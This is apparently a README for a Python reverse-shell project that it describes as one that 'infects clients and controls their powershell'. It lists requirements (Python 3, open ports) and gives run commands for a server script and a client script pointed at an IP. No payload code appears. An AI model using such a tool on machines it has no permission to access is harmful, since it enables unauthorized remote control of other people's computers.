# Reverse-Shell
Infects clients and controls their powershell with Python.
To de instalation you need has a server (any operative system) and 
execute the python script.
#### Requirements

- 🐍 Python 3.x 🐍
- 💫 Open Ports 💫

#### Installation
Linux or Windows or  MacOs

```sh
[Server]
python3 server.py
[Client]
python3 client.py {ip}
```
